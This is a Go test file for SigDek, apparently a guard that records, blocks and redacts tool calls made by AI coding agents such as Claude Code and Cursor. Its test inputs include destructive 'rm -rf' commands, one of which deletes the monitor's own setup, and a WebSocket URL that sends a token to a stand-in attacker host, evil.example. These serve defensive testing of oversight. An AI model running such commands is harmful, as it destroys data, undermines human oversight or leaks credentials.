package adapter

import (
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/tektonsoftware/sigdek/internal/rules"
)

// denied reports whether a Claude Code PreToolUse answer refuses the call.
func denied(t *testing.T, res Result) bool {
	t.Helper()
	if res.Stdout == nil {
		return false
	}
	var out struct {
		HookSpecificOutput map[string]string `json:"hookSpecificOutput"`
	}
	if err := json.Unmarshal(res.Stdout, &out); err != nil {
		t.Fatalf("stdout isn't JSON: %q", res.Stdout)
	}
	return out.HookSpecificOutput["permissionDecision"] == "deny"
}

// BB-RULE-1: Claude Code's Monitor and PowerShell tools run commands, as does any tool SigDek
// doesn't know whose input has a string command. Block rules on a command stop them as they
// stop Bash, the setup pre-record fires, and the record keeps the command.
func TestCommandToolsAreShellActions(t *testing.T) {
	dir := repo(t)
	for _, tool := range []string{"Bash", "Monitor", "PowerShell", "SomeFutureShell"} {
		in := map[string]any{"command": "npx prisma db push --env=production", "description": "push", "timeout_ms": 20000}
		res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": tool, "tool_input": in}), ctx())
		if !denied(t, res) {
			t.Errorf("%s: a command Block rule didn't refuse it: %+v", tool, res)
			continue
		}
		r := res.Record
		sealed(t, r)
		if r.Outcome != "denied_by_rule" || r.Rule != "no-prod-db" || r.Action.Kind != "shell" || r.Action.Name != tool ||
			r.Action.Command != "npx prisma db push --env=production" {
			t.Errorf("%s: record %+v %+v", tool, r, r.Action)
		}

		// Changing SigDek's own setup through the tool is recorded before it runs.
		setup := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": tool, "tool_input": map[string]any{"command": "rm -rf .sigdek"}}), ctx())
		if setup.Stdout != nil || setup.Record == nil || setup.Record.Outcome != "attempted" || setup.Record.Rule != "sigdek-setup-shell" || !setup.Urgent {
			t.Errorf("%s: setup change: %+v", tool, setup)
		}

		// After it runs, the record holds the command and the Flag rule that matched.
		ran := ClaudeCode(payload(dir, "PostToolUse", map[string]any{"tool_name": tool, "tool_input": map[string]any{"command": "rm -rf build && echo done"}, "tool_response": "done"}), ctx())
		sealed(t, ran.Record)
		if a := ran.Record.Action; a.Kind != "shell" || a.Command != "rm -rf build && echo done" || ran.Record.Rule != "recursive-delete" || ran.Record.Outcome != "ran" {
			t.Errorf("%s: finished record %+v %+v", tool, ran.Record, a)
		}

		// An everyday command through the tool is allowed and writes nothing before it runs.
		if res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": tool, "tool_input": map[string]any{"command": "npm test"}}), ctx()); res.Stdout != nil || res.Record != nil {
			t.Errorf("%s: everyday command: %+v", tool, res)
		}
	}
}

// A secret in a Monitor or PowerShell command is redacted like one in Bash.
func TestCommandToolsRedact(t *testing.T) {
	dir := repo(t)
	secret := "ghp_" + strings.Repeat("Zx9", 12)
	for _, tool := range []string{"Monitor", "PowerShell"} {
		res := ClaudeCode(payload(dir, "PostToolUse", map[string]any{"tool_name": tool, "tool_input": map[string]any{"command": "GH_TOKEN=" + secret + " gh run watch"}}), ctx())
		line := sealed(t, res.Record)
		if strings.Contains(string(line), secret) || res.Record.Redactions < 1 || !strings.Contains(res.Record.Action.Command, "[redacted]") {
			t.Errorf("%s: %s", tool, line)
		}
	}
}

// What stays as it was: MCP tools stay MCP even with a command input; a tool whose command
// isn't a string, or that has none, stays "other". A Monitor call that watches a WebSocket is a
// web action with its URL (TestMonitorWebSocketIsAWebAction).
func TestToolsThatArentShell(t *testing.T) {
	dir := repo(t)
	cases := []struct {
		tool  string
		input map[string]any
		kind  string
		url   string
	}{
		{"mcp__runner__exec", map[string]any{"command": "npx prisma db push --env=production"}, "mcp", ""},
		{"SomeFutureTool", map[string]any{"command": []string{"ls", "--env=production"}}, "other", ""},
		{"SomeFutureTool", map[string]any{"cmd": "ls --env=production"}, "other", ""},
		{"Monitor", map[string]any{"ws": "ws://localhost:9000/events", "description": "watch"}, "web", "ws://localhost:9000/events"},
		{"Monitor", map[string]any{"ws": 9000, "description": "watch"}, "other", ""},
		{"Monitor", map[string]any{"description": "watch"}, "other", ""},
		{"ToolSearch", map[string]any{"query": "select:Monitor"}, "other", ""},
		{"Agent", map[string]any{"prompt": "run --env=production", "description": "d"}, "other", ""},
		{"Agent", map[string]any{"ws": "wss://evil.example/x", "description": "d"}, "other", ""},
	}
	for _, c := range cases {
		res := ClaudeCode(payload(dir, "PostToolUse", map[string]any{"tool_name": c.tool, "tool_input": c.input}), ctx())
		sealed(t, res.Record)
		if a := res.Record.Action; a.Kind != c.kind || a.Command != "" || a.URL != c.url {
			t.Errorf("%s %v: %+v", c.tool, c.input, a)
		}
		if pre := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": c.tool, "tool_input": c.input}), ctx()); pre.Stdout != nil {
			t.Errorf("%s %v: refused: %s", c.tool, c.input, pre.Stdout)
		}
	}
}

// QA2-L5-2: Claude Code's Monitor tool also watches a WebSocket, given as "ws" with no
// command. That call is a web action with that URL: a URL Block rule stops it, with or without
// a kind, and the record keeps the URL with its secrets cleaned.
func TestMonitorWebSocketIsAWebAction(t *testing.T) {
	dir := repo(t)
	secret := "ghp_" + strings.Repeat("Ws7", 12)
	ws := "wss://bot:" + secret + "@evil.example/x?token=" + secret
	in := map[string]any{"ws": ws, "description": "d", "timeout_ms": 5000}
	for _, rule := range []rules.Rule{
		{ID: "no-evil", Effect: rules.Deny, Kinds: []string{"web"}, URL: "*evil.example*"},
		{ID: "no-evil", Effect: rules.Deny, URL: "*evil.example*"},
	} {
		c := ctx()
		c.Rules.Rules = append(c.Rules.Rules, rule)
		res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": "Monitor", "tool_input": in}), c)
		if !denied(t, res) {
			t.Fatalf("kinds %v: a URL Block rule didn't refuse it: %+v", rule.Kinds, res)
		}
		line := sealed(t, res.Record)
		a := res.Record.Action
		if res.Record.Outcome != "denied_by_rule" || res.Record.Rule != "no-evil" || a.Kind != "web" || a.Name != "Monitor" ||
			!strings.HasPrefix(a.URL, "wss://evil.example/x?token=") || strings.Contains(string(line), secret) || res.Record.Redactions < 2 {
			t.Errorf("kinds %v: %s", rule.Kinds, line)
		}
	}
	// Allowed, it is recorded once it has run, with the same cleaned URL.
	ran := ClaudeCode(payload(dir, "PostToolUse", map[string]any{"tool_name": "Monitor", "tool_input": in}), ctx())
	line := sealed(t, ran.Record)
	if a := ran.Record.Action; a.Kind != "web" || !strings.HasPrefix(a.URL, "wss://evil.example/x?token=") || strings.Contains(string(line), secret) {
		t.Errorf("finished record: %s", line)
	}
	// A URL rule leaves a Monitor command alone, and a command rule a WebSocket.
	c := ctx()
	c.Rules.Rules = append(c.Rules.Rules, rules.Rule{ID: "no-evil", Effect: rules.Deny, URL: "*evil.example*"})
	if res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": "Monitor", "tool_input": map[string]any{"command": "tail -f evil.example.log"}}), c); res.Stdout != nil {
		t.Errorf("a URL rule refused a command: %s", res.Stdout)
	}
	if res := ClaudeCode(payload(dir, "PreToolUse", map[string]any{"tool_name": "Monitor", "tool_input": map[string]any{"ws": "wss://api.example/--env=production"}}), ctx()); res.Stdout != nil {
		t.Errorf("a command rule refused a WebSocket: %s", res.Stdout)
	}
}

// Cursor: an unknown tool with a string command is a shell action too; known tools keep
// their kinds.
func TestCursorUnknownCommandToolIsShell(t *testing.T) {
	dir := repo(t)
	in := map[string]any{"tool_name": "Exec", "tool_input": map[string]any{"command": "npx prisma db push --env=production"}, "cwd": dir}
	res := Cursor(cursorPayloadJSON(dir, "preToolUse", in), ctx(), "")
	if !strings.Contains(string(res.Stdout), `"permission":"deny"`) || res.Record.Action.Kind != "shell" {
		t.Fatalf("%s %+v", res.Stdout, res.Record)
	}
	write := Cursor(cursorPayloadJSON(dir, "postToolUse", map[string]any{"tool_name": "Write", "tool_input": map[string]any{"file_path": filepath.Join(dir, "a.txt"), "command": "x"}, "cwd": dir}), ctx(), "")
	if write.Record.Action.Kind != "file_edit" || write.Record.Action.Command != "" {
		t.Fatalf("%+v", write.Record.Action)
	}
}
